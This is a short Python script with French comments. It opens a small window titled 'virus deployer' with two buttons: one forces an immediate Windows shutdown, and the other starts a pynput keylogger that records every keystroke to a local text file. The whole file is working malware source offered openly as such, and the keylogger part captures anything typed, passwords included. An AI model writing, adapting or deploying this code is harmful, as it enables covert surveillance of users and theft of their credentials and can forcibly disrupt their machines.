from pynput import keyboard
import tkinter as tk
from tkinter import Label
from PIL import Image, ImageTk
import webbrowser

def key():
    fichier = open("liberty.txt", "w")

    def on_press(key):
        try:
        # Écrire la touche pressée dans le fichier
            fichier.write(f'{key.char}')
            print(f'{key}')
        except AttributeError:
        # Écrire les touches spéciales
            fichier.write(f'[{key}]')
            variable = key
            print(variable)
    def on_release(key):
        fichier.write(f'{key}\n')
        if key == keyboard.Key.esc:
        # Fermer le fichier et arrêter l'écouteur sur pression de la touche Échap
         fichier.close()
        return False


   
# Configurer l'écouteur pour surveiller les événements de clavier
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()





def virus():
    import os

    # Éteindre le PC
    os.system("shutdown /s /f /t 0")





root = tk.Tk()
root.resizable(False, False)
root.title("virus deployer")

root.geometry("200x100")

bouton = tk.Button(root, text="shutdown program",command=virus)
bouton.pack(pady=10)

bouton2 = tk.Button(root, text="keylogger program",command=key)
bouton2.pack(pady=10)





root.mainloop()